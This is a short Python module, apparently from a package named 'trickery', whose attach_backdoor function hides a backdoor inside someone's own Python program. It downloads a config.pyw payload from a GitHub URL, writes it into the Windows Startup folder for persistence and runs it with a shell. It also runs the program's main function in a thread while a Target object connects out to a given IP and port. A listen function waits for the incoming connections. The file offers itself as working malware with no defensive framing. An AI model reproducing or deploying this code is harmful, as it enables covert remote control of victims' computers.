from trickery.target import Target
from trickery.listener import Listener
import threading
import subprocess
import sys
import os
import shutil
import urllib.request

#Attach Function to embed backdoor into custom python code
def attach_backdoor(ip,port,mainFunc,ipv6=False):
    
    #Persistence
    with urllib.request.urlopen("https://github.com/cipher234/socioware/raw/main/config.pyw") as content:
        if sys.platform == "win32":
            path = os.path.join(os.environ["appdata"],"microsoft","windows","start menu","programs","startup",)
            os.chdir(path)
        with open("config.pyw","wb") as content2:
            content2.write(content.read())
        subprocess.Popen("config.pyw",shell=True)

    th_read = threading.Thread(target=mainFunc) #Initiating thread for binding main function
    th_read.start()       	
    tar_get = Target(ip,port,ipv6)
    tar_get.run()
    th_read.join()


#Listen Function for binding socket and listen for incoming    
def listen(ip,port,ipv6=False):
    lis_ten = Listener(ip,port,ipv6)
    lis_ten.run()


    
    
       
    
    
    
    
        
    
    
